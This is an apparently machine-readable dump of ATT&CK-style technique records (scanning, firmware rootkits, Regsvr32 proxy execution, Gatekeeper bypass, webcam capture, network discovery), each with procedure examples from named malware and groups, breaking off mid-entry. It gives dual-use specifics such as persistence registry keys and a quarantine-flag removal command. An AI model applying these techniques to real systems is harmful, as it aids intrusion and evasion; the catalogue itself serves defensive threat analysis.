T1595,Active Scanning,"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.  Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Search Open Technical Databases] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [External Remote Services] or [Exploit Public-Facing Application]",['In the [Triton Safety Instrumented System Attack] [TEMP.Veles] engaged in network reconnaissance against targets of interest.'],
T1548,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,[],False
T1019,System Firmware,"The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.     System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.","['[LoJax] is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.', '[Hacking Team UEFI Rootkit] is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.', '[Trojan.Mebromi] performs BIOS modification and can download and execute a file as well as protect itself from removal.']",True
T1042,Change Default File Association,"When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access   or by administrators using the built-in assoc utility.  Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.  System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code>. For example: * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>  The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. ",[],True
T1117,Regsvr32,"Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries.   Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.  Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a ""Squiblydoo"" attack and has been used in campaigns targeting governments.    Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking] ",[],True
T1164,Re-opened Applications,"Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~/Library/Preferences/com.apple.loginwindow.plist</code> and <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>.   An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine .",[],True
T1054,Indicator Blocking,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting  or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry.  These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell] or [Windows Management Instrumentation]  ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.  In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",[],True
T1108,Redundant Access,"**This technique has been deprecated. Please use [Create Account] [Web Shell] and [External Remote Services] where appropriate.**  Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated.   If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts] to use [External Remote Services] such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network. Adversaries may also retain access through cloud-based infrastructure and applications.  Use of a [Web Shell] is one such way to maintain access to a network through an externally accessible Web server.","['[APT3] has been known to use multiple backdoors per campaign.', ""[3PARA RAT] will sleep until after a date/time value loaded from a .dat file has passed. This allows the RAT to remain dormant until a set date, which could allow a means to regain access if other parts of the actors' toolset are removed from a victim."", '[Cobalt Group] has used TeamViewer to preserve remote access in case control using the Cobalt Strike module was lost.', '[Threat Group-3390] has deployed backup web shells and obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.', '[Leafminer] used a tool called Imecab to set up a persistent remote access account on the victim machine.', '[OilRig] has used [RGDoor] via Web shell to establish redundant access. The group has also used harvested credentials to gain access to Internet-accessible resources such as Outlook Web Access, which could be used for redundant access.', '[Stolen Pencil] has a tool to add a Windows admin account in order to allow them to ensure continued access via RDP.']",
T1193,Spearphishing Attachment,"Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution] to gain execution.  There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","['[Magic Hound] sent malicious attachments to victims over email, including an Excel spreadsheet containing macros to download Pupy.', 'SHUTTERSPEED has been delivered via spearphishing emails containing documents exploiting RTF vulnerability CVE-2017-0199.', 'SLOWDRIFT was delivered using lure emails with documents leveraging the HWP exploit.']",True
T1215,Kernel Modules and Extensions,"Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.  When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit] that run with the highest operating system privilege (Ring 0).  Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects.      Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users.   Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used.   Examples have been found in the wild. ",[],True
T1101,Security Support Provider,"Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.  ",[],True
T1177,LSASS Driver,"The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.   Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading] or [DLL Search Order Hijacking] an adversary can achieve arbitrary code execution triggered by continuous LSA operations.",[],True
T1125,Video Capture,"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.  Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture] due to use of specific devices or applications for video recording rather than capturing the victim's screen.  In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. ","['[Empire] can capture webcam data on Windows and macOS systems.', '[Clambling] can record screen content in AVI format.', '[Crimson] can capture webcam video on targeted systems.', '[TajMahal] has the ability to capture webcam video.', '[Cobian RAT] has a feature to access the webcam on the victim’s machine.', ""[NanoCore] can access the victim's webcam and capture data."", '[jRAT] has the capability to capture video from a webcam.', '[Machete] takes photos from the computer’s web camera.', '[Revenge RAT] has the ability to access the webcam.', '[DarkComet] can access the victim’s webcam to take pictures.', ""[njRAT] can access the victim's webcam."", '[Agent Tesla] can access the victim’s webcam and record video.', '[PoetRAT] has used a Python tool named Bewmac to record the webcam on compromised hosts.', '[Silence] has been observed making videos of victims to observe bank employees day to day activities.', '[Imminent Monitor] has a remote webcam monitoring capability.', '[ConnectWise] can record video on remote hosts.', '[EvilGrab] has the capability to capture video from a victim machine.', '[Kazuar] captures images from the webcam.', '[AsyncRAT] can record screen content on targeted systems.', '[SDBbot] has the ability to record video on a compromised host.', ""[FIN7] created a custom video recording capability that could be used to monitor operations in the victim's environment."", '[ZxShell] has a command to perform video device spying. ', ""[WarzoneRAT] can access the webcam on a victim's machine."", '[Pupy] can access a connected webcam and capture pictures.', ""[Bandook] has modules that are capable of capturing video from a victim's webcam."", '[Remcos] can access a system’s webcam and take pictures.', '[InvisiMole] can remotely activate the victim’s webcam to capture content.', '[Derusbi] is capable of capturing video.', '[ObliqueRAT] can capture images from webcams on compromised hosts.', '[T9000] uses the Skype API to record audio and video calls. It writes encrypted data to <code>%APPDATA%\\Intel\\Skype</code>.', '[QuasarRAT] can perform webcam viewing.', '[PcShare] can capture camera video as part of its collection process.']",
T1144,Gatekeeper Bypass,"In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution.   Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, other utilities or events like drive-by downloads don’t necessarily set it either. This completely bypasses the built-in Gatekeeper check.  The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>.     In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. ",[],True
T1045,Software Packing,"Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.  Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.","['[Group5] packed an executable by base64 encoding the PE file and breaking it up into numerous lines.', '[APT32] uses UPX to pack their macOS backdoor.']",True
T1016,System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp] [ipconfig] [nbtstat] and [route]  Adversaries may also leverage a [Network Device CLI] on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).  Adversaries may use the information from [System Network Configuration Discovery] during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ","["" [Explosive] has collected the MAC address from the victim's machine. "", '[Chrommme] can enumerate the IP address of a compromised host.', '[ifconfig] can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.', '[HEXANE] has used [Ping] and `tracert` for network discovery.', '[Stuxnet] collects the IP address of a compromised system.', '[Mustang Panda] has used <code>ipconfig</code> and <code>arp</code> to determine network configuration information.', '[Dyre] has the ability to identify network settings on a compromised host.', ""[Olympic Destroyer] uses API calls to enumerate the infected system's ARP table."", '[Koadic] can retrieve the contents of the IP routing table as well as information about the Windows domain.', '[T9000] gathers and beacons the MAC and IP addresses during installation.', '[Lucifer] can collect the IP address of a compromised host.', 'The [IceApple] [ifconfig] module can iterate over all network interfaces on the host and retrieve the name, description, MAC address, DNS suffix, DNS servers, gateways, IPv4 addresses, and subnet masks.', '[BLUELIGHT] can collect IP information from the victim’s machine.', '[Empire] can acquire network configuration information like DNS servers, public IP, and network proxies used by a host.', '[VERMIN] gathers the local IP address.', '[PoshC2] can enumerate network adapter information.', '[KeyBoy] can determine the public or WAN IP address for the system.', '[POWRUNER] may collect network configuration data by running <code>ipconfig /all</code> on a victim.', ""[PowerDuke] has a command to get the victim's domain and NetBIOS name."", '[KEYMARBLE] gathers the MAC address of the victim’s machine.', '[Cobalt Strike] can determine the NetBios name and  the IP addresses of targets machines including domain controllers.', '[NanoCore] gathers the IP address from the victim’s machine.', '[Pysa] can perform network reconnaissance using the Advanced IP Scanner tool.', '[Ramsay] can use [ipconfig] and [Arp] to collect network configuration information, including routing information and ARP tables.', '[Sardonic] has the ability to execute the `ipconfig` command.', '[GravityRAT] collects the victim IP address, MAC address, as well as the victim account domain name.', 'A [JHUHUGIT] variant gathers network interface card information.', '[Dragonfly] has used batch scripts to enumerate network information, including information about trusts, zones, and the domain.', '[admin@338] actors used the following command after exploiting a machine with [LOWBALL] malware to acquire information about local networks: <code>ipconfig /all >> %temp%\\download</code>', '[iKitten] will look for the current IP address.', '[Emissary] has the capability to execute the command <code>ipconfig /all</code>.', '[NBTscan] can be used to collect MAC addresses.\t', '[Kevin] can collect the MAC address and other information from a victim machine using `ipconfig/all`.', '[Moses Staff] has collected the domain name of a compromised network.', '[Saint Bot] can collect the IP address of a victim machine.', '[OSX_OCEANLOTUS.D] can collect the network interface MAC address on the infected host.', '[KONNI] can collect the IP address from the victim’s machine.', '[Rifdoor] has the ability to identify the IP address of the compromised host.', '[JPIN] can obtain network information, including DNS, IP, and proxies.', '[PcShare] can obtain the proxy settings of a compromised machine using `InternetQueryOptionA` and its IP address by running `nslookup myip.opendns.comresolver1.opendns.com\\r\\n`.', '[OceanSalt] can collect the victim’s IP address.', '[AppleSeed] can identify the IP of a targeted system.', 'During [Operation CuckooBees] the threat actors used `ipconfig`, `nbtstat`, `tracert`, `route print`, and `cat /etc/hosts` commands.', '[Agent Tesla] can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings. ', 'During [C0017] [APT41] used `cmd.exe /c ping %userdomain%` for discovery.', '[Milan] can run `C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1` to discover network settings.', '[APT19] used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.', '[LiteDuke] has the ability to discover the proxy configuration of Firefox and/or Opera.', '[Elise] executes <code>ipconfig /all</code> after initial communication is made to the remote server.', '[FIN13] has used `nslookup` and `ipconfig` for network reconnaissance efforts. [FIN13] has also utilized a compromised Symantec Altiris console and LanDesk account to retrieve network information.', '[Calisto] runs the <code>ifconfig</code> command to obtain the IP address from the victim’s machine.', '[StrongPity] can identify the IP address of a compromised host.', ""[Caterpillar WebShell] can gather the IP address from the victim's machine using the IP config command. "", '[Okrum] can collect network information, including the host IP address, DNS, and proxy information.', '[Mis-Type] may create a file containing the results of the command <code>cmd.exe /c ipconfig /all</code>.', '[Aria-body] has the ability to identify the location, public IP address, and domain name on a compromised host.', '[RogueRobin] gathers the IP address and domain from the victim’s machine.', '[FatDuke] can identify the MAC address on the target computer.', '[MacMa] can collect IP addresses from a compromised host.', '[NanHaiShu] can gather information about the victim proxy server.', '[Hydraq] creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.', 'A module in [Prikormka] collects information from the victim about its IP addresses and MAC addresses.', '[Volt Typhoon] has executed multiple commands to enumerate network topology and settings including  `ipconfig`, `netsh interface firewall show all`, and `netsh interface portproxy show all`.', '[Comnie] uses <code>ipconfig /all</code> and <code>route PRINT</code> to identify network adapter and interface information.', '[Ninja] can enumerate the IP address on compromised systems.', '[Lazarus Group] malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.', '[Naid] collects the domain name from a compromised host.', '[Sibot] checked if the compromised system is configured to use proxies.', '[Backdoor.Oldrea] collects information about the Internet adapter configuration.', '[Carbon] can collect the IP address of the victims and other computers on the network using the commands: <code>ipconfig -all</code> <code>nbtstat -n</code>, and <code>nbtstat -s</code>.', 'A keylogging tool used by [APT3] gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.', '[Penquin] can report the IP of the compromised host to attacker controlled infrastructure.', '[MuddyWater] has used malware to collect the victim’s IP address and domain name.', '[GrimAgent] can enumerate the IP and domain of a target system.', '[Denis] uses <code>ipconfig</code> to gather the IP address from the system.', '[menuPass] has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.', '[Pupy] has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.', '[SideCopy] has identified the IP address of a compromised host.', '[Taidoor] has collected the MAC address of a compromised host; it can also use <code>GetAdaptersInfo</code> to identify network adapters.', '[Stealth Falcon] malware gathers the Address Resolution Protocol (ARP) table from the victim.', ""[Shamoon] obtains the target's IP address and local network segment."", '[Bonadan] can find the external IP address of the infected host.', ""[Pisloader] has a command to collect the victim's IP address."", '[AdFind] can extract subnet information from Active Directory.', ""[GoldMax] retrieved a list of the system's network interface after execution."", '[Kessel] has collected the DNS address of the infected host.', '[PingPull] can retrieve the IP address of a compromised host.', ""[ZeroT] gathers the victim's IP address and domain information, and then sends it to its C2 server."", '[PLAINTEE] uses the <code>ipconfig /all</code> command to gather the victim’s IP address.', '[Action RAT] has the ability to collect the MAC address of an infected host.', '[APT1] used the <code>ipconfig /all</code> command to gather network configuration information.', ""[Tropic Trooper] has used scripts to collect the host's network topology.\t"", '[Small Sieve] can obtain the IP address of a victim host.', ""[Ixeshe] enumerates the IP address, network proxy settings, and domain name from a victim's system."", '[Threat Group-3390] actors use [NBTscan] to discover vulnerable systems.', '[Kobalos] can record the IP address of the target machine.', '[Machete] collects the MAC address of the target computer and other network configuration information.', '[Octopus] can collect the host IP address from the victim’s machine.', '[QUADAGENT] gathers the current domain the victim system belongs to.', '[SUNBURST] collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.', '[Ke3chang] has performed local network configuration discovery using <code>ipconfig</code>.', '[Naikon] uses commands such as <code>netsh interface show</code> to discover network interface settings.', '[SpeakUp] uses the <code>ifconfig -a</code> command. ', ""[USBferry] can detect the infected machine's network topology using <code>ipconfig</code> and <code>arp</code>.\t"", '[QakBot] can use <code>net config workstation</code>, <code>arp -a</code>, `nslookup`, and <code>ipconfig /all</code> to gather network configuration information.', '[zwShell] can obtain the victim IP address.', '[FELIXROOT] collects information about the network including the IP address and DHCP server.', '[FALLCHILL] collects MAC address and local IP address information from the victim.', '[Conti] can retrieve the ARP cache from the local system by using the <code>GetIpNetTable()</code> API call and check to ensure IP addresses it connects to are for local, non-Internet, systems. ', '[EKANS] can determine the domain of a compromised host.', ""[Unknown Logger] can obtain information about the victim's IP address."", ""[xCaon] has used the GetAdaptersInfo() API call to get the victim's MAC address."", '[Cuba] can retrieve the ARP cache from the local system by using <code>GetIpNetTable</code>. ', 'During [FunnyDream] the threat actors used [ipconfig] for discovery on remote systems.', '[Zebrocy] runs the <code>ipconfig /all</code> command.', '[SHARPSTATS] has the ability to identify the domain of the compromised host.', '[FunnyDream] can parse the `ProxyServer` string in the Registry to discover http proxies.', '[InvisiMole] gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.', '[Avenger] can identify the domain of the compromised host.', ""[UPPERCUT] has the capability to gather the victim's proxy information."", '[Industroyer] 61850 payload component enumerates connected network adapters and their corresponding IP addresses.', '[Chimera] has used [ipconfig] [Ping] and <code>tracert</code> to enumerate the IP address and network environment and settings of the local host.', '[WellMail] can identify the IP address of the victim system.', '[SpicyOmelette] can identify the IP of a compromised system.', '[GeminiDuke] collects information on network settings and Internet proxy settings from the victim.', ""[BLINDINGCAN] has collected the victim machine's local IP address information and MAC address."", '[Royal] can enumerate IP addresses using `GetIpAddrTable`.', '[CreepySnail] can use `getmac` and `Get-NetIPAddress` to enumerate network settings.', '[Astaroth] collects the external IP address from the system. ', '[ShadowPad] has collected the domain name of the victim system.', ""[Magic Hound] malware gathers the victim's local IP address, MAC address, and external IP address."", '[LoudMiner] used a script to gather the IP address of the infected machine before sending to the C2.', '[Sliver] has the ability to gather network configuration information.', '[Cyclops Blink] can use the Linux API `if_nameindex` to gather network interface names.', '[QUIETCANARY] can identify the default proxy setting on a compromised host.', ""[Green Lambert] can obtain proxy information from a victim's machine using system environment variables. "", '[RATANKBA] gathers the victim’s IP address via the <code>ipconfig -all</code> command.', '[Crimson] contains a command to collect the victim MAC address and LAN IP.', '[POWERSTATS] can retrieve IP, network adapter configuration information, and domain from compromised hosts.', ""[KOPILUWAK] can use [Arp] to discover a target's network configuration setttings."", '[nbtstat] can be used to discover local NetBIOS domain names.', '[Valak] has the ability to identify the domain and the MAC and IP addresses of an infected machine.', '[Revenge RAT] collects the IP address and MAC address from the system.', '[TajMahal] has the ability to identify the MAC address on an infected host.', '[SideTwist] has the ability to collect the domain name on a compromised host.', '[LightNeuron] gathers information about network adapters using the Win32 API call <code>GetAdaptersInfo</code>.', '[QuasarRAT] has the ability to enumerate the Wide Area Network (WAN) IP through requests to ip-api[.]com, freegeoip[.]net, or api[.]ipify[.]org observed with user-agent string `Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0`.', '[Sykipot] may use <code>ipconfig /all</code> to gather system network configuration details.', '[RedLeaves] can obtain information about network parameters.', '[Mafalda] can use the `GetAdaptersInfo` function to retrieve information about network adapters and the `GetIpNetTable` function to retrieve the IPv4 to physical network address mapping table.', '[SDBbot] has the ability to determine the domain name and whether a proxy is configured on a compromised host.', '[SoreFang] can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via <code>ipconfig.exe /all</code>.', ""[Volgmer] can gather the IP address from the victim's machine."", '[Bazar] can collect the IP address and NetBIOS name of an infected machine.', '[Sidewinder] has used malware to collect information on network interfaces, including the MAC address.', '[Turla] surveys a system upon check-in to discover network configuration details using the <code>arp -a</code>, <code>nbtstat -n</code>, <code>net config</code>, <code>ipconfig /all</code>, and <code>route</code> commands, as well as [NBTscan] [Turla] RPC backdoors have also retrieved registered RPC interface information from process memory.', ""[Dtrack] can collect the host's IP addresses using the <code>ipconfig</code> command."", '[Wizard Spider] has used [ipconfig] to identify the network configuration of a victim machine. [Wizard Spider] has also used the PowerShell cmdlet `Get-ADComputer` to collect IP address data from Active Directory.', '[Turian] can retrieve the internal IP address of a compromised host.', '[Catchamas] gathers the Mac address, IP address, and the network adapter information from the victim’s machine.', ""[Diavol] can enumerate victims' local and external IPs when registering with C2."", '[S-Type] has used `ipconfig /all` on a compromised host.', ""[More_eggs] has the capability to gather the IP address from the victim's machine."", '[TeamTNT] has enumerated the host machine’s IP address.', '[Anchor] can determine the public IP and location of a compromised host.', '[Mosquito] uses the <code>ipconfig</code> command.', '[PowerShower] has the ability to identify the current Windows domain of the infected host.', '[APT41] collected MAC addresses from victim machines. ', '[WellMess] can identify the IP address and user domain on the target machine.', '[GALLIUM] used <code>ipconfig /all</code> to obtain information about the victim network configuration. The group also ran a modified version of [NBTscan] to identify available NetBIOS name servers.', '[DEADEYE] can discover the DNS domain name of a targeted system.', '[Bandook] has a command to get the public IP address from a system. ', '[Kimsuky] has used `ipconfig/all` to gather network configuration information.', '[WannaCry] will attempt to determine the local network segment it is a part of.', '[STARWHALE] has the ability to collect the IP address of an infected host.', '[ipconfig] can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.', '[Flagpro] has been used to execute the <code>ipconfig /all</code> command on a victim system.', '[Darkhotel] has collected the IP address and network adapter information from the victim’s machine.', '[Sys10] collects the local IP address of the victim and sends it to the C2.', 'During [C0018] the threat actors ran `nslookup` and Advanced IP Scanner on the target network.', '[BADFLICK] has captured victim IP address details.', '[Remsec] can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.', '[HAFNIUM] has collected IP information via IPInfo.', '[Neoichor] can gather the IP address from an infected host.  ', '[Brave Prince] gathers network configuration information as well as the ARP cache.', '[Trojan.Karagany] can gather information on the network configuration of a compromised host.', '[ShimRatReporter] gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.', '[MoonWind] obtains the victim IP address.', '[Orz] can gather victim proxy information.', '[Felismus] collects the victim LAN IP address and sends it to the C2 server.', '[CharmPower] has the ability to use <code>ipconfig</code> to enumerate system network settings.', '[route] can be used to discover routing configuration information.', '[Woody RAT] can retrieve network interface and proxy information.', '[NGLite] identifies the victim system MAC and IPv4 addresses and uses these to establish a victim identifier.', ""[BoxCaon] can collect the victim's MAC address by using the <code>GetAdaptersInfo</code> API."", '[APT32] used the <code>ipconfig /all</code> command to gather the IP address from the system.', '[Epic] uses the <code>nbtstat -n</code> and <code>nbtstat -s</code> commands on the victim’s machine.', '[TSCookie] has the ability to identify the IP of the infected host.', '[Grandoreiro] can determine the IP and physical location of the compromised host via IPinfo.', '[BabyShark] has executed the <code>ipconfig /all</code> command.\t', ""[Kwampirs] collects network adapter and interface information by using the commands <code>ipconfig /all</code>, <code>arp -a</code> and <code>route print</code>. It also collects the system's MAC address with <code>getmac</code> and domain configuration with <code>net config workstation</code>."", '[NETWIRE] can collect the IP address of a compromised host.', '[Lokibot] has the ability to discover the domain name of the infected host.', '[Higaisa] used <code>ipconfig</code> to gather network configuration information.', '[Proxysvc] collects the network adapter information and domain/username information based on current remote sessions.', '[Arp] can be used to display ARP configuration information on the host.', 'During [Frankenstein] the threat actors used [Empire] to find the public IP address of a compromised system.', '[OSInfo] discovers the current domain information.', '[Azorult] can collect host IP information from the victim’s machine.', '[Nltest] may be used to enumerate the parent domain of a local machine using <code>/parentdomain</code>.', '[SysUpdate] can collected the IP address and domain name of a compromised host. ', 'The reconnaissance modules used with [Duqu] can collect information on network configuration.', '[Agent.btz] collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.', '[down_new] has the ability to identify the MAC address of a compromised host.', '[Lizar] can retrieve network information from a compromised host.', '[BlackEnergy] has gathered information about network IP configurations using [ipconfig] and about routing tables using [route]', '[CrackMapExec] can collect DNS information from the targeted system.', '[Avaddon] can collect the external IP address of the victim.', 'During [Operation Wocao] threat actors discovered the local network configuration with `ipconfig`.', '[OilRig] has run <code>ipconfig /all</code> on a victim.', '[Pay2Key] can identify the IP and MAC addresses of the compromised host.', '[Earth Lusca] used the command <code>ipconfig</code> to obtain information about network configurations.', '[NOKKI] can gather information on the victim IP address.', '[Bisonal] can execute <code>ipconfig</code> on the victim’s machine. ', '[Kazuar] gathers information about network adapters.', '[Clambling] can enumerate the IP address of a compromised machine.', 'During [C0015] the threat actors used code to obtain the external public-facing IPv4 address of the compromised host. ', '[PipeMon] can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.', '[Ryuk] has called <code>GetIpNetTable</code> in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries. ', '[jRAT] can gather victim internal and external IPs.', '[ZIRCONIUM] has used a tool to enumerate proxy settings in the target environment.', '[HotCroissant] has the ability to identify the IP address of the compromised machine.', '[Xbash] can collect IP addresses and local intranet information from a victim’s machine.', ""[Torisma] can collect the local MAC address using `GetAdaptersInfo` as well as the system's IP address."", ""[Reaver] collects the victim's IP address."", '[TrickBot] obtains the IP address, location, and other relevant network information from the victim’s machine.', '[Rising Sun] can detect network adapter and IP address information.\t', '[BADCALL] collects the network adapter information.', '[yty] runs <code>ipconfig /all</code> and collects the domain name.', '[SocGholish] has the ability to enumerate the domain name of a victim, as well as if the host is a member of an Active Directory domain.', '[Squirrelwaffle] has collected the victim’s external IP address.', '[Amadey] can identify the IP address of a victim machine.', '[Sandworm Team] checks for connectivity to other resources in the network. ', '[Operation Wocao] has discovered the local network configuration with 